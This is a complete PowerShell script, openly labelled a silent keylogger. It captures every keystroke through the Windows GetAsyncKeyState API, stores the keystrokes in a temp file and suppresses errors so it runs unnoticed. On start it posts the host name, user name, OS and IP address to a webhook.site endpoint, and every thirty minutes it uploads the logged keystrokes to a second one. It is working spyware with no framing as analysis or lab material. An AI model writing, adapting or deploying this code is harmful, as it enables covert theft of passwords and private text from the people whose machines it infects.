# Silent keylogger - 30 minute capture intervals with startup notification
Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
$s='[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vKey);'
$kAPI=Add-Type -MemberDefinition $s -Name "Win32" -Namespace "Key" -PassThru -ErrorAction SilentlyContinue

function Send-StartupNotification {
    $w = 'https://webhook.site/208938a9'
    $p = @{
        timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        computer = $env:COMPUTERNAME
        user = $env:USERNAME
        status = "KEYLOGGER_STARTED"
        message = "Keylogger activated successfully - Monitoring keystrokes every 30 minutes"
        os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
    } | ConvertTo-Json -Compress
    
    try {
        $null = Invoke-RestMethod -Uri $w -Method Post -Body $p -ContentType 'application/json' -ErrorAction SilentlyContinue
    } catch { }
}

function Send-KeylogData {
    param($content)
    
    if ($content -and $content.Trim() -ne '') {
        $w = 'https://webhook.site/f7d322ce-f1a9-4e5f-a411-66776438c41f'
        $p = @{
            timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
            computer = $env:COMPUTERNAME
            user = $env:USERNAME
            content = $content
            characters = $content.Length
            session_duration = "30 minutes"
            type = "KEYLOG_DATA"
        } | ConvertTo-Json -Compress
        
        try {
            $null = Invoke-RestMethod -Uri $w -Method Post -Body $p -ContentType 'application/json' -ErrorAction SilentlyContinue
            return $true
        } catch { 
            return $false
        }
    }
    return $false
}

function Execute-Keylogger {
    $lP = "$env:TEMP\kl.txt"
    $startupSent = $false
    
    if (-not (Test-Path $lP)) { "" | Out-File $lP -ErrorAction SilentlyContinue }
    
    while ($true) {
        try {
            # Send startup notification only once
            if (-not $startupSent) {
                Send-StartupNotification
                $startupSent = $true
            }
            
            # Don't clear file - keep accumulating for 30 minutes
            $sT = [System.DateTime]::Now
            $eT = $sT.AddMinutes(30)
            
            # Capture keystrokes for 30 minutes
            while ([System.DateTime]::Now -lt $eT) {
                for ($i = 8; $i -le 254; $i++) {
                    $st = $kAPI::GetAsyncKeyState($i)
                    if ($st -eq -32767) {
                        $k = [System.Windows.Forms.Keys]$i
                        switch ($k) {
                            'Space' { Add-Content -Path $lP -Value ' ' -NoNewline -ErrorAction SilentlyContinue }
                            'Enter' { Add-Content -Path $lP -Value "`r`n" -NoNewline -ErrorAction SilentlyContinue }
                            'Back' { Add-Content -Path $lP -Value '[BACKSPACE]' -NoNewline -ErrorAction SilentlyContinue }
                            'Tab' { Add-Content -Path $lP -Value '[TAB]' -NoNewline -ErrorAction SilentlyContinue }
                            'Escape' { Add-Content -Path $lP -Value '[ESC]' -NoNewline -ErrorAction SilentlyContinue }
                            'ControlKey' { Add-Content -Path $lP -Value '[CTRL]' -NoNewline -ErrorAction SilentlyContinue }
                            'ShiftKey' { Add-Content -Path $lP -Value '[SHIFT]' -NoNewline -ErrorAction SilentlyContinue }
                            'Menu' { Add-Content -Path $lP -Value '[ALT]' -NoNewline -ErrorAction SilentlyContinue }
                            'LWin' { Add-Content -Path $lP -Value '[WIN]' -NoNewline -ErrorAction SilentlyContinue }
                            'RWin' { Add-Content -Path $lP -Value '[WIN]' -NoNewline -ErrorAction SilentlyContinue }
                            'Capital' { Add-Content -Path $lP -Value '[CAPS]' -NoNewline -ErrorAction SilentlyContinue }
                            default { 
                                if ($k.ToString().Length -eq 1 -and $k -ne 'Return') {
                                    Add-Content -Path $lP -Value $k.ToString() -NoNewline -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
                }
                Start-Sleep -Milliseconds 10
            }
            
            # After 30 minutes, read and send accumulated data
            $cC = Get-Content $lP -Raw -ErrorAction SilentlyContinue
            if ($cC -and $cC.Trim() -ne '') {
                $success = Send-KeylogData -content $cC
                if ($success) {
                    # Clear file only after successful upload
                    "" | Out-File $lP -Force -ErrorAction SilentlyContinue
                }
                # If upload fails, data remains in file for next attempt
            } else {
                # No data captured, clear file for fresh start
                "" | Out-File $lP -Force -ErrorAction SilentlyContinue
            }
            
        } catch { }
    }
}

# Start the keylogger silently
Execute-Keylogger